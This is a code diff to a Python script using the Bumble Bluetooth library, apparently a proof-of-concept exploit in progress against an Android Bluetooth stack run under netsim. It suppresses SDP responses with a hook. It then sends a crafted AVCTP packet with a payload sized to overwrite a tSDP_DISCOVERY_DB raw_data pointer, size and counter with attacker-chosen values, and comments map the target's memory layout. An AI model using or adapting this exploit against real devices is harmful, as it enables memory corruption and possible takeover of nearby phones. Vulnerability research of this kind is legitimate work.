@@ -1,9 +1,11 @@
 import asyncio
+import struct
 
 import bumble.logging
-from bumble import core, hci, rfcomm, transport, utils, hfp, sdp
+from bumble import core, hci, rfcomm, transport, utils, hfp, sdp, avrcp
 from bumble.colors import color
 from bumble.device import Connection, Device, DeviceConfiguration
+from bumble.l2cap import ClassicChannelSpec
 
 hci_transport = "android-netsim"
 device_config = "device.json"
@@ -40,6 +42,18 @@ def _default_configuration() -> hfp.AgConfiguration:
     )
 
 
+def AvctMakePacket(transaction_label, packet_type, is_command, ipid, pid,
+                   payload):
+    return (struct.pack(
+        ">BH",
+        transaction_label << 4
+        | packet_type << 2
+        | (0 if is_command else 1) << 1
+        | (1 if ipid else 0),
+        pid,
+    ) + payload)
+
+
 async def main():
     bumble.logging.setup_basic_logging("INFO")
     async with await transport.open_transport(hci_transport) as (
@@ -51,11 +65,35 @@ async def main():
         device.classic_enabled = True
         channel = 3
         configuration = _default_configuration()
+
+        ag_sdp_record_handle = 0x00010001
+        avrcp_controller_service_record_handle = 0x00010002
+        avrcp_target_service_record_handle = 0x00010003
+
         device.sdp_service_records = {
-            1: hfp.make_ag_sdp_records(1, channel, configuration)
+            ag_sdp_record_handle:
+            hfp.make_ag_sdp_records(1, ag_sdp_record_handle, configuration),
+            avrcp_controller_service_record_handle:
+            avrcp.make_controller_service_sdp_records(
+                avrcp_controller_service_record_handle),
+            avrcp_target_service_record_handle:
+            avrcp.make_target_service_sdp_records(
+                avrcp_controller_service_record_handle),
         }
-        print(device.sdp_server.on_sdp_service_search_attribute_request)
+
         requests = []
+
+        await device.power_on()
+        connection = await device.connect(
+            address, transport=core.PhysicalTransport.BR_EDR)
+        await connection.encrypt()
+
+        avrcp_protocol = avrcp.Protocol()
+        avrcp_protocol.listen(device)
+        await avrcp_protocol.connect(connection)
+
+        await asyncio.sleep(
+            1)  # TODO(zhuowei): wait for EVENT_CONNECTION instead
 
         def my_hook(request_):
             print("got SDP, doing NOTHING", request_)
@@ -64,10 +102,6 @@ async def main():
         device.sdp_server.orig_on_sdp_service_search_attribute_request = device.sdp_server.on_sdp_service_search_attribute_request
         device.sdp_server.on_sdp_service_search_attribute_request = my_hook
 
-        await device.power_on()
-        connection = await device.connect(
-            address, transport=core.PhysicalTransport.BR_EDR)
-        await connection.encrypt()
         rfcomm_client = rfcomm.Client(connection)
         rfcomm_mux = await rfcomm_client.start()
         channel = await rfcomm_mux.open_dlc(4)
@@ -83,6 +117,18 @@ async def main():
                 error_code=sdp.SDP_INVALID_SERVICE_RECORD_HANDLE_ERROR,
             ))
         await asyncio.sleep(0.5)
+        # with 0xef as my filler:
+        # 0000  00 00 02 01 0b 01 01 00 19 00 07 01 03 01 75 00   ..............u.
+        # 0010  06 06 41 ef ef ef ef ef ef ef ef ef ef ef ef ef   ..A.............
+        buf_offset = 0x13
+        tSDP_DISCOVERY_DB_raw_data_offset = 0x70
+        # raw_data, raw_size, raw_used
+        avrcp_command_buf = b"A" * (
+            tSDP_DISCOVERY_DB_raw_data_offset - buf_offset) + struct.pack(
+                "<QII", 0x41414141_41414141, 0x41414141, 0x0) + b"\xef" * 0x80
+        avrcp_protocol.avctp_protocol.l2cap_channel.send_pdu(
+            AvctMakePacket(0, avrcp.Protocol.PacketType.START, False, False,
+                           0x4141, avrcp_command_buf))
         device.sdp_server.orig_on_sdp_service_search_attribute_request(
             requests[1])
         await asyncio.sleep(4)
